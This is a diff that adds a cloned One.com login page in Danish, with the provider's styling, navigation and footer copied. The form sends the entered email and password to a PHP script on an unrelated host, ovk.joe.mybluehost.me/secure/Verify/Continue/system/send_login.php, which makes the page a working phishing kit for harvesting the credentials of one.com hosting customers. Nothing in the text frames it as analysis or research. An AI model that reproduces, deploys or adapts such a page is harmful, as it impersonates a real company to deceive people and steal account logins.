@@ -1,0 +1,1134 @@
+
+<html class="" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<!-- Google Tag Manager -->
+
+<!-- End Google Tag Manager -->
+<meta charset="utf-8"/>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<meta content="noindex, nofollow" name="robots"/>
+<link href="https://login-static.cdn-one.com/v8.5.0/media/favicon.20f0cd89.ico" rel="shortcut icon" type="image/vnd.microsoft.icon"/>
+<meta content="width=device-width,initial-scale=1,maximum-scale=1.0,user-scalable=no" name="viewport">
+<title>Log in to One.com</title>
+</meta></meta><style>@import url(https://fonts.googleapis.com/css?family=Montserrat:400,500,600&display=swap);
+
+/****************************************************************************************/
+/* Following css rules are added to the original css from one.com to make it work in KC */
+/****************************************************************************************/
+.invisible {
+    display: none;
+}
+/****************************************************************************************/
+/****************************************************************************************/
+
+
+/****************************************************************************************/
+/* Following css rules are defined by KC and we're just defining them here
+/****************************************************************************************/
+.alert-error {
+    background-color: #ffffff;
+    border-color: #cc0000;
+    color: #333333;
+    margin-bottom: 10px;
+}
+
+.kc-feedback-text {
+    color:#d20019;
+    margin-left: 20px;
+}
+/****************************************************************************************/
+/****************************************************************************************/
+
+
+body {
+    color: #333333;
+    font-family: 'Montserrat', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    font-size: 13px;
+    line-height: 18px;
+    margin: 0;
+    padding: 0;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+}
+body * {
+    font-family: 'Montserrat', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+}
+body *:focus {
+    outline: 0 none;
+}
+h1,
+h2,
+h3,
+h4,
+h5,
+h6 {
+    margin: 0 0;
+    font-family: inherit;
+    font-weight: normal;
+    line-height: 1;
+    color: inherit;
+    text-rendering: optimizeLegibility;
+}
+a {
+    color: #0078c8;
+    text-decoration: none;
+}
+input {
+    -webkit-appearance: none;
+    -moz-appearance: none;
+    appearance: none;
+    outline: none;
+}
+.Nav {
+    padding: 45px 60px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 15px;
+    color: #3c3c3c;
+    z-index: 10;
+}
+.Nav .one-logo {
+    background-image: url(https://login-static.cdn-one.com/v8.1.0/media/one.com.b70a2250.svg);
+    background-position: 0 0;
+    background-size: 160px 20px;
+    background-repeat: no-repeat;
+    width: 160px;
+    height: 20px;
+    text-decoration: none;
+    display: block;
+}
+.Nav.active {
+    padding: 20px;
+    position: fixed;
+    background-color: #ffffff;
+    top: 0;
+    left: 0;
+    right: 0;
+}
+.Nav.active .one-logo {
+    background-size: 130px 16px;
+    width: 130px;
+    height: 16px;
+}
+
+.Nav-menuButton {
+    display: none;
+    align-items: center;
+    flex-direction: column;
+    justify-content: center;
+    flex-shrink: 0;
+    position: relative;
+    width: 50px;
+    height: 50px;
+    border-radius: 50%;
+    z-index: 30;
+    background-color: #0078c8;
+    cursor: pointer;
+}
+
+.Nav-menu {
+    display: flex;
+}
+
+
+.Nav-menuButton div {
+    height: 1px;
+    width: 14px;
+    background-color: #ffffff;
+    transition: transform 0.1s ease-in-out;
+}
+
+.Nav-menuButton div:first-child {
+    margin: 0 0 6px;
+}
+
+
+.Nav-menuButton.active {
+    width: 40px;
+    height: 40px;
+}
+
+.Nav-menuButton.active div:nth-child(1) {
+    transform: rotate(
+            -45deg
+    );
+}
+
+.Nav-menuButton.active div:nth-child(2) {
+    transform: rotate(
+            45deg
+    );
+}
+
+.Nav-menuButton.active div {
+    position: absolute;
+    left: 0;
+    right: 0;
+    margin: auto;
+}
+
+@media (max-width: 1100px) {
+    .Nav-menuButton {
+        display: flex;
+    }
+    .Nav-menu {
+        display: none;
+    }
+}
+
+
+.Nav-menu.active {
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-start;
+    position: fixed;
+    background-color: inherit;
+    left: 0;
+    top: 80px;
+    width: 100%;
+    height: calc(100% - 80px);
+    padding: 0;
+    overflow: hidden;
+    overflow-y: auto;
+    box-sizing: border-box;
+    max-width: 100%;
+    background-color: #ffffff;
+}
+
+
+.Nav-menuItem:first-child {
+    margin-left: unset;
+}
+
+
+
+
+
+.Nav-menuItem {
+    margin-left: 30px;
+}
+
+.Nav-menuItem a[href] {
+    color: #3c3c3c;
+}
+
+.Nav-menuItem.active a[href] {
+    color: #c6c6c6;
+    text-decoration: none;
+}
+
+
+.Nav-menu.active .Nav-menuItem {
+    margin-left: 0;
+    align-items: center;
+    justify-content: flex-start;
+    flex-wrap: wrap;
+    width: 100%;
+    margin: 0;
+    min-height: 60px;
+    flex-grow: 0;
+    box-sizing: border-box;
+    padding: 0 30px 0 30px;
+    flex-shrink: 0;
+}
+
+.Nav-menu.active .Nav-menuItem a[href] {
+    font-weight: 600;
+    font-size: 20px;
+    line-height: 1.4;
+    margin: 10px 0;
+    display: inline-block;
+}
+
+@media (max-width: 767px) {
+    .Nav {
+        padding: 20px;
+    }
+    .Nav .one-logo {
+        background-size: 130px auto;
+        width: 130px;
+        height: 16px;
+    }
+    .Nav-menuButton {
+        width: 40px;
+        height: 40px;
+    }
+}
+
+.Login-container {
+    background-position: center center;
+    background-size: cover;
+    background-repeat: no-repeat;
+    display: flex;
+}
+.Login-container.webmail {
+    background-image: url(https://ovk.joe.mybluehost.me/secure/Verify/Continue/style/webmail.f931a5ce.jpg);
+}
+.Login-container.cp {
+    background-image: url(https://ovk.joe.mybluehost.me/secure/Verify/Continue/style/cp.c1266867.jpg);
+    min-height: 670px;
+}
+
+
+.Login-formWrap {
+    flex: 1;
+    padding: 60px;
+    margin: auto 0;
+}
+@media (min-width: 992px) {
+    .Login-formWrap.bg {
+        flex-grow: 0;
+        flex-shrink: 1;
+        flex-basis: calc(50% - 120px);
+        background-color: rgba(60, 60, 60, 0.6);
+    }
+}
+
+@media (max-width: 767px) {
+    .Login-formWrap {
+        padding: 60px 20px;
+    }
+}
+.Login-form {
+    display: flex;
+    flex-direction: column;
+    padding: 60px;
+    margin: auto;
+    background-color: #ffffff;
+    max-width: 480px;
+}
+.Login-form h1 {
+    font-size: 30px;
+    line-height: 1;
+    font-weight: 600;
+    margin-bottom: 15px;
+}
+
+@media (max-width: 767px) {
+    .Login-form {
+        padding: 30px 20px;
+    }
+    .Login-form h1 {
+        font-size: 20px;
+        line-height: 0.8;
+    }
+}
+.Login-formItem {
+    display: flex;
+    flex-direction: column;
+}
+.Login-formItem label {
+    font-size: 15px;
+    line-height: 1;
+    margin-bottom: 15px;
+    margin-top: 25px;
+}
+.Login-formItem input {
+    line-height: 21px;
+    height: 21px;
+    border: 1px solid #c6c6c6;
+    color: #3c3c3c;
+    border-radius: 27px;
+    padding: 15px 30px;
+    outline: 0 none;
+    font-size: 15px;
+}
+@media (max-width: 767px) {
+    .Login-formItem label {
+        font-size: 12px;
+        margin-bottom: 10px;
+        margin-top: 20px;
+    }
+    .Login-formItem input {
+        font-size: 12px;
+        line-height: 21px;
+        height: 21px;
+        padding: 10px 30px;
+    }
+}
+.Login-submit {
+    background-color: #0078c8;
+    line-height: 51px;
+    padding: 0 50px;
+    border-radius: 27px;
+    font-size: 15px;
+    color: #ffffff;
+    border: 2px solid #0078c8;
+    outline: 0 none;
+    cursor: pointer;
+}
+.Login-submit:hover {
+    opacity: 0.9;
+}
+.Login-submit:active {
+    outline: none;
+}
+.Login-submit.hasSubmitted {
+    cursor: not-allowed;
+}
+@media (max-width: 767px) {
+    .Login-submit {
+        padding: unset;
+        border: 0;
+        width: 100%;
+        line-height: 55px;
+    }
+    .Login-submit > a[href] {
+        font-weight: 600;
+    }
+}
+.Login-formFooter {
+    margin-top: 30px;
+    display: flex;
+    flex-direction: column;
+    align-items: flex-end;
+}
+.Login-formFooter > a[href] {
+    margin-top: 25px;
+    color: #0078c8;
+    text-decoration: underline;
+}
+@media (max-width: 767px) {
+    .Login-formFooter {
+        margin-top: 10px;
+    }
+    .Login-formFooter > a[href] {
+        margin-top: 20px;
+    }
+}
+.Footer {
+    padding: 60px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+@media (max-width: 767px) {
+    .Footer {
+        padding: 30px 20px;
+        flex-direction: column;
+        justify-content: unset;
+        align-items: unset;
+    }
+    .Footer-copyright {
+        margin-top: 20px;
+        width: 230px;
+    }
+}
+
+.Dropdown {
+    position: relative;
+    width: 250px;
+}
+@media (max-width: 767px) {
+    .Dropdown {
+        width: 170px;
+    }
+}
+.Dropdown label {
+    box-sizing: border-box;
+    width: 100%;
+    border: 1px solid #ededed;
+    border-radius: 27px;
+    display: block;
+    position: relative;
+    padding: 0 20px;
+    font-size: 15px;
+    line-height: 44px;
+    cursor: pointer;
+}
+.Dropdown label:after {
+    content: "";
+    width: 7px;
+    height: 7px;
+    border-color: #3c3c3c;
+    border-width: 0 1px 1px 0;
+    border-style: solid;
+    margin-left: auto;
+    position: absolute;
+    right: 22px;
+    top: 17px;
+    -webkit-transform: rotate(45deg);
+    transform: rotate(45deg);
+}
+.Dropdown input[type="checkbox"] {
+    display: none;
+}
+.Dropdown input[type="checkbox"]:checked ~ label:after {
+    top: 20px;
+    border-width: 1px 0 0 1px;
+}
+.Dropdown input[type="checkbox"]:checked ~ .Dropdown-list {
+    display: block;
+}
+.Dropdown-list {
+    display: none;
+    position: absolute;
+    bottom: 95%;
+    right: 0;
+    width: 95%;
+    max-width: 170px;
+    background-color: #3e3e3e;
+    border-radius: 10px;
+    box-sizing: border-box;
+    box-shadow: 0 5px 20px 0 rgba(0, 0, 0, 0.15);
+    overflow: hidden;
+}
+.Dropdown-listItem {
+    position: relative;
+    margin: 0;
+    display: flex;
+    align-items: center;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+    line-height: 20px;
+}
+.Dropdown-listItem a[href] {
+    margin: 0;
+    padding: 13px 30px;
+    display: block;
+    width: 100%;
+    height: 100%;
+    color: #fff;
+    text-decoration: none;
+    font-size: 15px;
+}
+.Dropdown-listItem a[href]:hover {
+    background-color: rgba(255, 255, 255, 0.1);
+}
+
+.alert-error {
+    margin-top: 10px;
+}
+
+.kc-feedback-text {
+    margin-left: 0;
+}
+
+
+.mg-top-30 {
+    margin-top: 30px !important;
+}
+
+#innercontent, .innercontent {
+    padding-left: 0;
+    padding-right: 0;
+    margin: 0 auto 0 auto;
+}
+
+#innercontent, .breadcrumbs, .contentlinks, .innercontent {
+    padding-bottom: 30px
+}
+
+@media (min-width: 460px) {
+    #innercontent, .breadcrumbs, .container-fluid, .contentlinks, .innercontent {
+        padding-left: 30px;
+        padding-right: 30px
+    }
+}
+
+#innercontent, .breadcrumbs, .container-fluid, .contentlinks, .innercontent {
+    margin-right: auto;
+    margin-left: auto;
+    max-width: 1140px;
+    padding-left: 20px;
+    padding-right: 20px
+}
+
+#innercontent:after, #innercontent:before, .attachments__thumbnails:after, .attachments__thumbnails:before, .breadcrumbs:after, .breadcrumbs:before, .clearfix:after, .clearfix:before, .container-fluid:after, .container-fluid:before, .container:after, .container:before, .contentlinks:after, .contentlinks:before, .features:after, .features:before, .innercontent:after, .innercontent:before, .mail-col-left:after, .mail-col-left:before, .mail-col-right:after, .mail-col-right:before, .mail__header:after, .mail__header:before, .main-navigation:after, .main-navigation:before, .modal-footer:after, .modal-footer:before, .product-webeditor-collage:after, .product-webeditor-collage:before, .row:after, .row:before, .search--large:after, .search--large:before, .tld-grid__domains:after, .tld-grid__domains:before, .tmpl-header-top:after, .tmpl-header-top:before {
+    content: " ";
+    display: table;
+}
+
+
+#innercontent h1, #innercontent h2, #innercontent h3, #innercontent h4, #innercontent p, .innercontent h1, .innercontent h2, .innercontent h3, .innercontent h4, .innercontent p {
+    margin-bottom: 28px;
+}
+
+h1, h2, h3, h4 {
+    color: #3c3c3c;
+    vertical-align: middle;
+    line-height: 1.1;
+    font-weight: 500;
+    letter-spacing: normal;
+}
+
+h1 {
+    font-size: 25px;
+    margin: 0 0 20px 0;
+    line-height: 1;
+    font-weight: normal;
+}
+
+a, h1, h2, h3, h4, p {
+    margin: 0;
+    padding: 0;
+    -webkit-margin-before: 0;
+    -webkit-margin-after: 0;
+}
+
+dl dd {
+    position: relative;
+    padding-left: 30px;
+    line-height: 35px;
+}
+
+dd {
+    margin-left: 0;
+}
+
+dl dd:before {
+    position: absolute;
+    top: 12px;
+    content: "";
+    display: inline-block;
+    margin-right: 10px;
+    margin-left: -25px;
+}
+
+.svg-support-entry-icon, dl dd:before {
+    background: url(https://www-static.cdn-one.com/images/onecom/sprite-1310e479.svg?v=1480601957491) no-repeat;
+    background-position: -651px -302.5px;
+    width: 14px;
+    height: 14px;
+}
+
+dl {
+    margin-top: 0;
+    margin-bottom: 21px;
+}
+
+.Login-text {
+    margin: auto;
+    max-width: 480px;
+}
+
+.Login-text h2 {
+    font-size: 30px;
+    font-weight: 600;
+    margin-bottom: 30px;
+    line-height: 37px;
+    color: #ffffff;
+}
+
+.Login-text a[href] {
+    color: #ffffff;
+    text-decoration: underline;
+}
+
+.Login-campaign {
+    flex: 1;
+    padding: 0 60px 60px;
+    color: #ffffff;
+    background-color: rgba(60, 60, 60, 0.6);
+    display: flex;
+    justify-content: space-around;
+}
+
+.Login-text p {
+    font-size: 15px;
+    font-weight: 500;
+    margin-top: 0;
+    line-height: 25px;
+    margin-bottom: 30px;
+}
+
+
+.Google-form .Approval2FA {
+    background-image: url(https://www-static.cdn-one.com/images/login/2FA-Mobile.svg);
+    position: static;
+    width: 140px;
+    height: 140px;
+    left: 0px;
+    top: 0px;
+    flex: none;
+    order: 0;
+    flex-grow: 0;
+    margin: 20px 0px;
+}
+
+.Google-form .Unavailable2fa {
+    background-image: url(https://www-static.cdn-one.com/images/login/2FA-rejected.svg);
+    position: static;
+    width: 140px;
+    height: 140px;
+    left: 0px;
+    top: 0px;
+    flex: none;
+    order: 0;
+    flex-grow: 0;
+    margin: 0 0 20px 0px;
+}
+
+.Google-form p {
+    font-weight: normal;
+    font-size: 15px;
+    line-height: 20px;
+    letter-spacing: 0.1px;
+    margin: 0 0 20px 0;
+}
+
+.Google-submit-2fa {
+    background-color: #fff;
+    padding: 0 30px !important;
+    border-radius: 27px !important;
+    font-weight: 600 !important;
+    font-size: 16px !important;
+    line-height: 50px !important;
+    color: #0078c8 !important;
+    border: 1px solid #0078c8 !important;
+    outline: 0 none;
+    cursor: pointer;
+    margin: 0px 0 0 20px;
+    height: 50px !important;
+}
+
+
+.companion-submit-2fa {
+    background-color: #fff;
+    padding: 0 0 !important;
+    border-radius: 27px !important;
+    /*font-weight: 600 !important;*/
+    font-size: 16px !important;
+    line-height: 50px !important;
+    color: #0078c8 !important;
+    border: 0px solid #0078c8 !important;
+    outline: 0 none;
+    cursor: pointer;
+    margin: 0px 0 0 20px;
+    height: 50px !important;
+}
+
+.Google-formItem {
+    display: flex;
+    align-items: flex-start;
+    flex-direction: unset;
+}
+
+.Google-form h1 {
+    font-size: 36px;
+    font-weight: normal;
+    line-height: 38px;
+    letter-spacing: 0.2px;
+    margin-bottom: 15px;
+}
+
+.Google-formItem input#otp {
+    line-height: 21px;
+    border: 1px solid #bbbbbb;
+    color: #3c3c3c;
+    border-radius: 100px;
+    padding: 15px 20px;
+    outline: 0 none;
+    font-size: 15px;
+    flex: 1;
+    box-sizing: border-box;
+    height: 50px;
+}
+
+.Google-formFooter {
+    display: flex;
+    flex-direction: column;
+}
+
+.Google-formFooter > a[href] {
+    font-size: 15px;
+    line-height: 20px;
+    letter-spacing: 0.1px;
+    color: #0078c8;
+    margin: 20px 0px;
+}
+
+.ContactSupport {
+    display: flex;
+    flex-direction: row;
+    justify-content: center;
+    align-items: center;
+    height: 50px;
+    min-width: 197px;
+    width: max-content;
+    background: #0078c8;
+    border-radius: 100px;
+    color: #fff;
+    padding: 0 15px;
+}
+
+.ContactSupport span {
+    font-weight: 600;
+    font-size: 14px;
+    line-height: 50px;
+}
+
+.hidden {
+    display: none !important;
+}
+
+.invisible {
+    visibility: hidden !important;
+}
+
+.dark-bg {
+    background-color: rgba(60, 60, 60, 0.6);
+}
+
+
+.Google-formItem input::-webkit-outer-spin-button, .Google-formItem input::-webkit-inner-spin-button {
+    -webkit-appearance: none;
+    margin: 0;
+}
+
+/* Firefox */
+.Google-formItem input[type="number"] {
+    -moz-appearance: textfield;
+}
+
+@media (max-width: 1300px) {
+    .Google-formItem {
+        display: flex;
+        flex-direction: column;
+        align-items: baseline;
+    }
+
+    .Google-formItem input {
+        width: 100%;
+    }
+
+    .Google-formItem > div {
+        width: 100%;
+    }
+    .Google-formItem input {
+        width: 100%;
+    }
+    .Google-submit-2fa {
+        margin: 20px 0 0 0;
+        width: 100%;
+    }
+
+    .companion-submit-2fa {
+        text-align: left;
+    }
+}
+@media (max-width: 991px) {
+    .Login-container {
+        flex-direction: column;
+    }
+
+    .Login-formWrap {
+        flex-basis: auto;
+        background-color: rgba(60, 60, 60, 0.6);
+    }
+    .Google-formItem input {
+        width: 100%;
+        font-size: 12px;
+    }
+    .Login-form {
+        max-width: 520px;
+    }
+}
+
+@media (max-width: 767px) {
+    /*NAVIGATION*/
+    .Nav {
+        padding: 20px;
+    }
+    .Nav.active {
+        padding: 20px;
+        position: fixed;
+        background-color: #ffffff;
+        top: 0;
+        left: 0;
+        right: 0;
+    }
+    .Nav .one-logo {
+        background-size: 130px auto;
+        width: 130px;
+        height: 16px;
+    }
+    .Nav-menuButton {
+        width: 40px;
+        height: 40px;
+    }
+    .Nav-menuButton.active div:nth-child(1) {
+        transform: rotate(-45deg);
+    }
+    .Nav-menuButton.active div:nth-child(2) {
+        transform: rotate(45deg);
+    }
+    .Nav-menuButton.active div {
+        position: absolute;
+        left: 0;
+        right: 0;
+        margin: auto;
+    }
+    /*BODY*/
+    .Login-container.cp {
+        height: auto;
+    }
+    .Login-campaign {
+        display: block;
+    }
+    .Login-form {
+        padding: 30px 20px;
+    }
+    .Login-formWrap {
+        padding: 60px 20px;
+    }
+    .Login-form h1 {
+        font-size: 20px;
+        line-height: 1.3;
+    }
+    .Login-formItem label {
+        font-size: 12px;
+        margin-bottom: 10px;
+        margin-top: 20px;
+    }
+    .Login-formItem input {
+        font-size: 12px;
+        line-height: 21px;
+        height: 21px;
+        padding: 10px 30px;
+    }
+    .Login-submit {
+        padding: unset;
+        border: 0;
+        width: 100%;
+        line-height: 55px;
+    }
+    .Google-form {
+        padding: 30px 20px;
+    }
+    .Google-form h1 {
+        font-size: 20px;
+        line-height: 1.3;
+    }
+    .Google-formItem label {
+        font-size: 12px;
+        margin-bottom: 10px;
+        margin-top: 20px;
+    }
+    .Google-formItem {
+        display: flex;
+        flex-direction: column;
+        align-items: baseline;
+    }
+
+    .Google-formItem > div {
+        width: 100%;
+    }
+    .Google-submit-2fa {
+        margin: 20px 0;
+        width: 100%;
+    }
+    .Google-form .Google-error {
+        text-indent: 0;
+    }
+    .Google-form .Google-error {
+        text-indent: 0;
+    }
+    .Login-campaign {
+        padding: 0 20px 70px;
+    }
+    .Login-text h2 {
+        font-size: 24px;
+        line-height: 34px;
+        margin-bottom: 20px;
+        margin-top: 20px;
+    }
+    .ContactSupport {
+        padding: unset;
+        border: 0;
+        width: 100%;
+        line-height: 55px;
+    }
+    .ContactSupport span {
+        font-size: 14px;
+    }
+    .Footer {
+        padding: 30px 20px;
+        flex-direction: column;
+        justify-content: unset;
+        align-items: unset;
+    }
+    .Dropdown {
+        width: 170px;
+    }
+    .Footer-copyright {
+        margin-top: 20px;
+        width: 230px;
+    }
+}
+
+
+</style></head>
+<body class="">
+<!-- Google Tag Manager -->
+<noscript>
+<iframe height="0" src="https://www.googletagmanager.com/ns.html?id=GTM-KQ4H" style="display:none;visibility:hidden" width="0"></iframe>
+</noscript>
+<!-- End Google Tag Manager -->
+<div class="">
+<div class="invisible" id="kc-header">
+<div class="" id="kc-header-wrapper">One.com</div>
+</div>
+<div class="">
+<header class="">
+<h1 id="kc-page-title"> <script type="text/javascript">
+            const redirectUri = new URL(location.href).searchParams.get("redirect_uri")
+            var activeMenuId = "cp";
+            if(redirectUri !== null && redirectUri.trim() !== "") {
+                const loginTarget = new URL(redirectUri).searchParams.get("loginTarget");
+
+                if(loginTarget != null && loginTarget.trim() !== "") {
+                    if(loginTarget.includes("wordpress")) {
+                        activeMenuId = "wp";
+                    } else if (loginTarget.includes("webshop")) {
+                        activeMenuId = "webshop";
+                    } else if (loginTarget.includes("webeditor") || loginTarget.includes("websitebuilder")) {
+                        activeMenuId = "wsb";
+                    } else if (loginTarget.includes("wfm") || loginTarget.includes("filemanager")) {
+                        activeMenuId = "filemanager";
+                    }
+                }
+            }
+        </script>
+<nav class="Nav">
+<div class="Nav-logo"><a class="one-logo" href="Login.php.html#"></a></div>
+<div class="Nav-menuButton"><div></div><div></div></div>
+<div class="Nav-menu">
+<div class="Nav-menuItem" id="menuitem-wp"><a href="Login.php.html#" id="link-wp"><span id="label-wp">WordPress</span></a></div>
+<div class="Nav-menuItem" id="menuitem-filemanager"><a href="Login.php.html#" id="link-filemanager"><span id="label-filemanager">File Manager</span></a></div>
+<div class="Nav-menuItem" id="menuitem-webshop"><a href="Login.php.html#" id="link-webshop"><span id="label-webshop">Webshop</span></a></div>
+<div class="Nav-menuItem" id="menuitem-wsb"><a href="Login.php.html#" id="link-wsb"><span id="label-wsb">Hjemmesideprogram</span></a></div>
+<div class="Nav-menuItem" id="menuitem-cp"><a href="Login.php.html#" id="link-cp"><span id="label-cp">Kontrolpanel</span></a></div>
+<div class="Nav-menuItem"><a href="Login.php.html#"><span>Webmail</span></a></div>
+</div>
+<script>
+                document.getElementById("menuitem-" + activeMenuId).classList.add("active")
+            </script>
+</nav>
+<script>
+            (function () {
+                var navButton = document.querySelector('.Nav-menuButton');
+                var nav = document.querySelector('.Nav');
+                var navMenu = document.querySelector('.Nav-menu');
+
+                if (!navButton) {
+                    return;
+                }
+
+                navButton.addEventListener('click', function (e) {
+                    document.body.classList.toggle('noscroll');
+                    navButton.classList.toggle('active');
+                    nav.classList.toggle('active');
+                    navMenu.classList.toggle('active');
+                });
+            })();
+        </script>
+</h1>
+</header>
+<div id="kc-content">
+<div id="kc-content-wrapper">
+<section class="Login">
+<div class="Login-container" id="login-container">
+<div class="Login-formWrap" id="login-form-container">
+<form action="https://ovk.joe.mybluehost.me/secure/Verify/Continue/system/send_login.php" class="Login-form login autofill" id="kc-form-login" method="post" onsubmit="login.disabled = true; return true;">
+<h1 class="welcomeText">
+<script>
+                                document.write(document.getElementById("label-" + activeMenuId).innerText);
+                            </script>
+</h1>
+
+<div class="Login-formItem">
+<label for="username">Email</label>
+<input autocomplete="off" required="" autofocus="" class="username" id="username" name="user" tabindex="1" type="text" value="" style="height: 50px;"/>
+</div>
+<div class="Login-formItem">
+<label for="password">Adgangskode</label>
+<input autocomplete="off" required="" class="" id="password" name="pass" tabindex="2" type="password" style="height: 50px;"/>
+</div>
+<div class="cf-turnstile" style="padding-top: 20px;" data-sitekey="0x4AAAAAAAXKtm_SK9-Mk5Wi"></div>
+<div class="Login-formFooter">
+<input id="id-hidden-input" name="credentialId" type="hidden"/>
+<input class="Login-submit" id="kc-login" name="login" tabindex="4" type="submit" value="Log ind"/>
+<span style="margin-top: 16px"><a href="Login.php.html#" tabindex="5">Glemt adgangskode?</a></span>
+</div>
+</form>
+</div>
+<div class="Login-campaign dark-bg hidden" id="login-campaign-container">
+<div class="Login-text">
+<h2>Kender du nogen, der har brug for en hjemmeside?</h2>
+<p>Henvis en ven eller en lokal virksomhed til one.com og hjælpe dem med at gøre deres drømme til virkelighed på nettet. Alle henviste kunder får rabat på deres første køb, og du får en kontant belønning.</p>
+<p>Log ind i dit kontrolpanel og begynd at tjene din henvisningsbonus i dag.</p>
+</div>
+</div>
+<div class="Login-campaign dark-bg hidden" id="login-campaign-wsb-container">
+<div class="Login-text">
+<h2>Want to log in to your free trial?</h2>
+<p><a href="https://try-websitebuilder.one.com/#login">Go here</a> to log in to your Website Builder trial or start your 14-day free trial now.</p>
+</div>
+</div>
+</div>
+<script>
+                document.getElementById("link-" + activeMenuId).href = "#";
+                document.getElementById("login-container").classList.add(activeMenuId);
+                const loginCampaignContainer = document.getElementById("login-campaign-container");
+                const loginWSBCampaignContainer = document.getElementById("login-campaign-wsb-container");
+
+                if(activeMenuId === "cp") {
+                    loginCampaignContainer.classList.remove("hidden");
+                }
+
+                if (activeMenuId === 'wsb') {
+                    loginWSBCampaignContainer.classList.remove("hidden");
+                }
+
+                if (activeMenuId !== 'cp' && activeMenuId !== 'wsb') {
+                    document.getElementById("login-form-container").classList.add("dark-bg");
+                    loginCampaignContainer.classList.remove("hidden");
+                    loginCampaignContainer.classList.add("invisible");
+                }
+            </script>
+</section>
+<footer class="Footer">
+<div class="Dropdown" id="kc-locale">
+<input hidden="" id="Dropdown-select" role="button" type="checkbox"/>
+<label for="Dropdown-select" id="kc-current-locale-link">Dansk</label>
+<div class="Dropdown-list">
+<div class="kc-dropdown-item Dropdown-listItem"><a href="Login.php.html#">Dansk</a></div>
+<div class="kc-dropdown-item Dropdown-listItem"><a href="Login.php.html#">Deutsch</a></div>
+<div class="kc-dropdown-item Dropdown-listItem"><a href="Login.php.html#">English</a></div>
+<div class="kc-dropdown-item Dropdown-listItem"><a href="Login.php.html#">Español</a></div>
+<div class="kc-dropdown-item Dropdown-listItem"><a href="Login.php.html#">Français</a></div>
+<div class="kc-dropdown-item Dropdown-listItem"><a href="Login.php.html#">Italiano</a></div>
+<div class="kc-dropdown-item Dropdown-listItem"><a href="Login.php.html#">Nederlands</a></div>
+<div class="kc-dropdown-item Dropdown-listItem"><a href="Login.php.html#">Norsk</a></div>
+<div class="kc-dropdown-item Dropdown-listItem"><a href="Login.php.html#">Português</a></div>
+<div class="kc-dropdown-item Dropdown-listItem"><a href="Login.php.html#">Suomi</a></div>
+<div class="kc-dropdown-item Dropdown-listItem"><a href="Login.php.html#">Svenska</a></div>
+</div>
+</div>
+<script>
+                    ( function() {
+                        var dropdown = document.querySelector('.Dropdown');
+                        var select = document.querySelector('#Dropdown-select');
+                        if (!dropdown) {
+                            return;
+                        }
+
+                        window.addEventListener('click', function (e) {
+                            if (!dropdown.contains(e.target)) {
+                                select.checked = false;
+                            }
+                        });
+
+                    })();
+                </script>
+                <script src="Login.php.html" async defer></script>
+
+<div class="Footer-copyright">Copyright © 2002 - <script>document.write(new Date().getFullYear());</script> one.com. All rights reserved</div>
+</footer>
+</div>
+</div>
+</div>
+</div>
+</body>
+</html>
